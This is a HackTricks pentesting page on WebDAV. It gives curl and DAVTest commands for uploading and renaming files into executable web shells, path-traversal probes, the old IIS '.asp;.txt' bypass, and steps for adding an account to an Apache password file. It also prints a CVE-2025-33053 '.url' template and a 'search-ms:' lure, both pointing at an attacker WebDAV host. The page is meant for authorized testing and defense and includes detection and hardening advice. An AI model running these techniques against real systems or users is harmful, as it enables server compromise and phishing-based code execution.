---
title: "WebDav"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/put-method-webdav.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Discovery and write-capability verification

Start with `OPTIONS`, but treat `Allow`/`Public` headers only as an implementation hint: a method can be advertised but denied to the current principal, hidden from the header yet routed by another component, or permitted only below a particular collection. Nmap’s `http-webdav-scan` combines `OPTIONS` with `PROPFIND` and may also expose internal names returned in DAV XML.[\[6\]](#references)

```
nmap -p80,443 --script http-webdav-scan \
  --script-args http-webdav-scan.path='/dav/' <target>
curl -isku 'user:password' -X OPTIONS 'https://target.example/dav/'
curl -isku 'user:password' -X PROPFIND -H 'Depth: 0' \
  -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><propfind xmlns="DAV:"><prop><resourcetype/><getcontenttype/><getetag/></prop></propfind>' \
  'https://target.example/dav/'
curl -isku 'user:password' -X PROPFIND -H 'Depth: 1' \
  'https://target.example/dav/'
```
`Depth: 0` fingerprints one resource and `Depth: 1` enumerates its immediate children; a successful response is normally `207 Multi-Status`, so parse the per-resource `<status>` elements rather than relying only on the outer status. Avoid `Depth: infinity` on production trees because recursive traversal can be expensive.[\[5\]](#references)

Test each write primitive with a unique marker in a disposable collection. `Overwrite: F` prevents `COPY`/`MOVE` from replacing an existing destination; `201` usually means creation, `204` means an existing destination was overwritten, and `412` is expected when overwrite was refused. Always GET/PROPFIND the destination and compare the bytes instead of trusting a client’s summary.[\[5\]](#references)

```
base='https://target.example/dav'; auth='user:password'; n="ht-$RANDOM"
printf 'webdav-marker\n' > "/tmp/$n.txt"
curl -isku "$auth" -X PUT --data-binary @"/tmp/$n.txt" "$base/$n.txt"
curl -isku "$auth" -X COPY -H "Destination: $base/$n.copy" -H 'Overwrite: F' "$base/$n.txt"
curl -isku "$auth" -X MOVE -H "Destination: $base/$n.moved" -H 'Overwrite: F' "$base/$n.copy"
curl -sku "$auth" "$base/$n.moved"; curl -isku "$auth" -X PROPFIND -H 'Depth: 0' "$base/$n.moved"
curl -isku "$auth" -X DELETE "$base/$n.moved"; curl -isku "$auth" -X DELETE "$base/$n.txt"
```
To overcome restrictions on file uploads, especially those preventing the execution of server-side scripts, you might:

- **Upload** files with**executable extensions** directly if not restricted.
- **Rename** uploaded non-executable files (like .txt) to an executable extension.
- **Copy** uploaded non-executable files, changing their extension to one that is executable.

## DavTest

**DAVTest** attempts to upload files with several extensions and checks whether the resulting resources are accessible or executed:

```
davtest [-auth user:password] -move -sendbd auto -url http://<IP> # Upload .txt files and try to move them to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Output sample:

A successful access test for **`.txt`** or **`.html`** does not mean the server executes those extensions; it only proves that the files are retrievable.

## Cadaver

Cadaver is an interactive WebDAV client for manually uploading, moving, copying, and deleting resources.

```
cadaver <IP>
```
## PUT request

```
curl -T 'shell.txt' "http://$ip/"
```
## MOVE request

```
curl -X MOVE --header "Destination: http://$ip/shell.php" "http://$ip/shell.txt"
```
## Verb-specific path normalization and authorization

WebDAV expands one endpoint into several filesystem operations, so test canonicalization and authorization **per verb**, not only with `GET`. Compare slash, backslash, encoded separator, duplicate separator, and dot-segment handling with a client that preserves the request target (for example, `curl --path-as-is`). Keep probes inside a sacrificial collection until the behavior is understood.[\[5\]](#references)[\[7\]](#references)

A useful case study is the PaperCut WebDAV chain disclosed in 2024: a third-party servlet sanitized forward slashes, while Jetty passed backslashes and Windows interpreted them as separators. The mismatch made traversed `PROPFIND`, `PUT`, and `DELETE` operations possible even though a separate filter blocked `GET`. This illustrates why a GET-only security filter does not protect a DAV namespace.[\[7\]](#references)

```
# Compare responses; substitute a harmless in-scope collection and marker.
base='https://target.example/dav'; auth='user:password'
curl --path-as-is -isku "$auth" -X PROPFIND -H 'Depth: 0' "$base/a/../probe"
curl --path-as-is -isku "$auth" -X PROPFIND -H 'Depth: 0' "$base/a%5c..%5cprobe"
curl --path-as-is -isku "$auth" -X PROPFIND -H 'Depth: 0' "$base/a\\..\\probe"
```
`COPY` and `MOVE` have **two authorization targets**: the Request-URI source and the `Destination` URI. Test that normalization, tenant boundaries, and access control are applied to both, and compare absolute-URI and same-origin destination forms accepted by the deployment. Use `Overwrite: F` and unique names while testing to prevent unintended replacement.[\[5\]](#references)

Hardening should disable unused DAV verbs, keep writable DAV storage outside executable web roots, reject ambiguous separators before routing, authorize only after a single canonicalization step, and enforce the same containment rules on the source and destination. Limit recursive `PROPFIND`, XML body size, upload size, and storage quota to reduce denial-of-service impact.[\[5\]](#references)[\[7\]](#references)

## IIS5/6 WebDav Vulnerability

Historical IIS 5/6 deployments could combine WebDAV extension filtering with wildcard ASP mappings in a way that rejected a direct `.asp` upload but treated a name such as `.asp;.txt` as executable ASP. This depends on obsolete IIS/script-map configuration and should not be expected on current IIS.[\[5\]](#references)

In a vulnerable lab, upload the payload as `.txt`, then copy or move it to an `.asp;.txt` name and request that resource. Some clients may report the MOVE as failed even though the destination was created, so verify with `PROPFIND` or a subsequent GET rather than trusting one status display.

## Post credentials

After obtaining authorized host access to an Apache WebDAV server, inspect its enabled virtual-host configuration. A common path is:**/etc/apache2/sites-enabled/000-default**

Inside it you could find something like:

```
ServerAdmin webmaster@localhost
        Alias /webdav /var/www/webdav
        <Directory /var/www/webdav>
                DAV On
                AuthType Digest
                AuthName "webdav"
                AuthUserFile /etc/apache2/users.password
                Require valid-user
```
The `AuthUserFile` directive identifies the password file used for this directory:

```
/etc/apache2/users.password
```
Such files contain usernames and password verifiers, not plaintext passwords. Preserve permissions and crack or modify them only within the engagement scope.

With authorization, you can audit a verifier or add/update an account:

```
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
To check if the new credentials are working you can do:

```
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Client-side WebDAV delivery and execution

WebDAV is also useful on the **client side**: Windows can treat a remote WebDAV location as a **working directory**, an **Explorer search location**, or a **document lure** instead of only as a server-side upload target. Common remote path forms are ordinary UNC paths and WebDAV-specific paths such as `\\host@80\share` or `\\host@ssl@443\DavWWWRoot\share`. When Windows resolves them it will usually start the **WebClient** service and generate **`davclnt.dll`** network traffic.[\[2\]](#references)

### Internet Shortcut (`.url`) + remote `WorkingDirectory`

`.url`) + remote `WorkingDirectory`
An Internet Shortcut can launch a **local signed binary** while forcing its **current working directory** to an attacker-controlled WebDAV share. If that parent process later starts a child **by bare filename** (for example `route.exe` instead of `C:\Windows\System32\route.exe`), Windows may resolve and execute the remote file from WebDAV first.

This was highlighted by **CVE-2025-33053**. Patched Windows releases address the documented chain, but the general audit lesson remains: a binary that resolves children or dependencies from an attacker-controlled working directory can become a remote search-path execution gadget.[\[3\]](#references)[\[4\]](#references)

```
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\attacker@ssl@443\DavWWWRoot\share
ShowCommand=7
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
IconIndex=13
```
Abuse notes:

- The remote payload must use the **exact** child/dependency name requested by the parent (`route.exe` ,`netsh.exe` ,`ping.exe` , etc.).
- Good candidates are binaries that **run without mandatory arguments** and later call`ShellExecute` /`CreateProcess` with a**bare name** . If the binary uses a**fully qualified path** , the working-directory substitution normally fails.
- `ShowCommand=7` starts the signed binary minimized, while`IconFile` and`IconIndex` can make the`.url` look like a PDF/browser/document shortcut.
- This is a remote variant of **search-path hijacking** : conceptually similar to[DLL hijacking / weak search-path issues](../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.html) , but with the attacker-controlled search location hosted over WebDAV.

For lab discovery, create several `.url` files that all point their `WorkingDirectory` to the same WebDAV share, then upload harmless test executables named after likely child processes/dependencies. Any shortcut that launches the remote test binary identifies another candidate LOLBin.

### `search-ms:` and `.library-ms` WebDAV/UNC lures

`search-ms:` and `.library-ms` WebDAV/UNC lures
Instead of downloading a file directly, a phishing page can make **Explorer** render a remote WebDAV directory as search results:

```
search-ms:displayname=Search Results in \\attacker@80\Downloads\Docs&query=*.scr&crumb=location:\\attacker@80\Downloads\Docs
```
This makes the remote file look like an **Explorer result** instead of a normal browser download. Operators commonly combine this with:[\[2\]](#references)

- **RTLO / `U+202E`**
- **Double extensions** such as`report.pdf.scr`
- **Whitespace padding** before`.exe` /`.scr`
- **Fake PDF / Office / browser icons**

Similar delivery can use **`.library-ms`** files that point to external UNC/WebDAV locations. For more general document-lure ideas see [Phishing Files & Documents](../../generic-methodologies-and-resources/phishing-methodology/phishing-documents.html), and for the **NTLM-leak** side of `.library-ms` / shortcut abuse see [Places to steal NTLM creds](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html).

### Detection ideas

- `.url` files containing`WorkingDirectory=\\\\...@80\\` ,`@ssl@443` , or`DavWWWRoot`
- **WebClient** service start events followed by**`davclnt.dll`** network activity
- Trusted Windows binaries spawning children whose **image path** is a**UNC/WebDAV** location
- Explorer/browser activity that immediately opens **`search-ms:`** or**`.library-ms`** references to external shares
- Remote executables masquerading as documents via **RTLO** ,**double extensions** , or**long whitespace padding**<sup>[\[2\]](#references)</sup>

## References
